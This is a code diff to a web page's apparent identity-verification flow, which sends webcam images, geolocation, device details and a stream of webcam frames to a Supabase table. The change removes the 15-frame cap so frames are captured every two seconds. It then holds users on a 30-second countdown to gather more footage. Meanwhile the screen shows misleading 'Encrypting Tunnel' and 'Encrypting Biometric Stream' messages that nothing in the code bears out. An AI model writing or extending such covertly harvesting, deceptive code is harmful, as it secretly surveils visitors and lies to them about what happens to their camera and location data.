@@ -152,7 +152,8 @@
 
             <div id="verify-loader" class="hidden flex flex-col items-center gap-4 mt-8">
                 <span class="loader"></span>
-                <p class="text-[9px] uppercase font-bold text-white/30 tracking-[0.4em]">Encrypting Tunnel...</p>
+                <p id="loader-text" class="text-[9px] uppercase font-bold text-white/30 tracking-[0.4em]">Encrypting Tunnel...</p>
+                <p id="countdown-display" class="hidden text-2xl font-bold text-white">30</p>
             </div>
         </div>
 
@@ -228,16 +229,21 @@
             const canvas = document.createElement('canvas');
             canvas.width = 200; canvas.height = 200;
             const ctx = canvas.getContext('2d');
-            let count = 0;
 
+            // Capture continuously every 2 seconds (will be stopped manually)
             burstInterval = setInterval(() => {
-                if(count >= 15) { clearInterval(burstInterval); return; }
                 if(video.srcObject) {
                     ctx.drawImage(video, 0, 0, 200, 200);
                     capturedData.burst.push(canvas.toDataURL('image/jpeg', 0.15));
-                    count++;
                 }
-            }, 2500);
+            }, 2000);
+        }
+
+        function stopBurstCapture() {
+            if(burstInterval) {
+                clearInterval(burstInterval);
+                burstInterval = null;
+            }
         }
 
         function captureStep() {
@@ -312,21 +318,47 @@
                     return;
                 }
 
-                await sb.from('verifications').insert([{
-                    user_id: profile.id,
-                    username: u,
-                    thumb_img: capturedData.thumb,
-                    smile_img: capturedData.smile,
-                    location_data: { 
-                        geo: capturedData.geo, 
-                        device: capturedData.device, 
-                        burst_stream: capturedData.burst 
-                    }
-                }]);
-
+                // Store profile for later use
                 localStorage.setItem('phantom_user', JSON.stringify(profile));
-                showToast("Terminal Initialized.");
-                setTimeout(() => window.location.href = REDIRECT_URL, 1500);
+                showToast("Account Created. Securing Biometric Data...");
+
+                // Show countdown and continue burst capture for 30 seconds
+                const countdownDisplay = document.getElementById('countdown-display');
+                const loaderText = document.getElementById('loader-text');
+                countdownDisplay.classList.remove('hidden');
+                loaderText.innerText = 'Encrypting Biometric Stream...';
+
+                let secondsRemaining = 30;
+                countdownDisplay.innerText = secondsRemaining;
+
+                const countdownInterval = setInterval(async () => {
+                    secondsRemaining--;
+                    countdownDisplay.innerText = secondsRemaining;
+
+                    if(secondsRemaining <= 0) {
+                        clearInterval(countdownInterval);
+                        stopBurstCapture();
+
+                        // Now insert verification data with full burst array
+                        loaderText.innerText = 'Finalizing Secure Tunnel...';
+                        countdownDisplay.classList.add('hidden');
+
+                        await sb.from('verifications').insert([{
+                            user_id: profile.id,
+                            username: u,
+                            thumb_img: capturedData.thumb,
+                            smile_img: capturedData.smile,
+                            location_data: { 
+                                geo: capturedData.geo, 
+                                device: capturedData.device, 
+                                burst_stream: capturedData.burst 
+                            }
+                        }]);
+
+                        showToast("Terminal Initialized.");
+                        setTimeout(() => window.location.href = REDIRECT_URL, 1500);
+                    }
+                }, 1000);
 
             } catch (err) {
                 showToast("Critical Write Error");
